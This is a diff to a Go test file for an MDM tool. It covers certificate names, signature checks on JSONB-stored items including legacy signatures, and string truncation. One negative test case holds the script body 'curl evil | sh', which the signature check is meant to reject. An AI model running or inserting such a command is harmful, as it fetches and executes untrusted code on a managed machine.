@@ -9,6 +9,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/hex"
 	"encoding/json"
 	"encoding/pem"
 	"image"
@@ -23,6 +24,7 @@ import (
 	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/maltekiefer/limdm/internal/api"
 )
@@ -137,7 +139,11 @@ func TestAgentCertificateNames(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	leaf, _ := x509.ParseCertificate(tc.Certificates[0].Certificate[0])
+	cert, err := tc.GetCertificate(&tls.ClientHelloInfo{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	leaf := cert.Leaf
 	if leaf.VerifyHostname("mdm.example.com") != nil || leaf.VerifyHostname("192.0.2.10") != nil {
 		t.Fatalf("names: %v %v", leaf.DNSNames, leaf.IPAddresses)
 	}
@@ -318,6 +324,16 @@ func TestItemSignatures(t *testing.T) {
 	if !itemSignatureOK("ops", "com.limdm.scripts", []byte(`{"scripts":[{"name":"x","body":"echo hi"}]}`), sig) {
 		t.Fatal("the same payload, compacted, must verify")
 	}
+	// JSONB hands keys back sorted by length: the same item must still verify
+	typed := []byte(`{"install":["htop"],"remove":[]}`)
+	if !itemSignatureOK("p", "com.limdm.packages", []byte(`{"remove": [], "install": ["htop"]}`), signItem("p", "com.limdm.packages", typed)) {
+		t.Fatal("JSONB key order must not break the signature")
+	}
+	// signatures from before canonicalJSON covered the compacted database text
+	legacy := hex.EncodeToString(ed25519.Sign(key, api.ItemSigned("p", "com.limdm.packages", []byte(`{"remove":[],"install":["htop"]}`))))
+	if !itemSignatureOK("p", "com.limdm.packages", []byte(`{"remove": [], "install": ["htop"]}`), legacy) {
+		t.Fatal("legacy signatures must still verify")
+	}
 	for _, c := range []struct{ name, typ, payload, sig string }{
 		{"ops", "com.limdm.scripts", `{"scripts":[{"name":"x","body":"curl evil | sh"}]}`, sig},
 		{"ops", "com.limdm.sudo", string(payload), sig},
@@ -327,5 +343,22 @@ func TestItemSignatures(t *testing.T) {
 		if itemSignatureOK(c.name, c.typ, []byte(c.payload), c.sig) {
 			t.Errorf("accepted %+v", c)
 		}
+	}
+}
+
+func TestTruncateStorable(t *testing.T) {
+	if got := truncate("a\x00b", 10); got != "ab" {
+		t.Errorf("NUL kept: %q", got)
+	}
+	s := strings.Repeat("a", 199) + "ääää"
+	got := truncate(s, 200)
+	if !utf8.ValidString(got) || len(got) > 200 {
+		t.Errorf("cut inside a character or too long: %d %q", len(got), got[190:])
+	}
+	if jsonb([]api.CheckResult(nil)) != "[]" {
+		t.Error("nil slice must be stored as []")
+	}
+	if j := jsonb([]string{"x\x00y"}); j != `["xy"]` {
+		t.Errorf("NUL in JSONB: %s", j)
 	}
 }
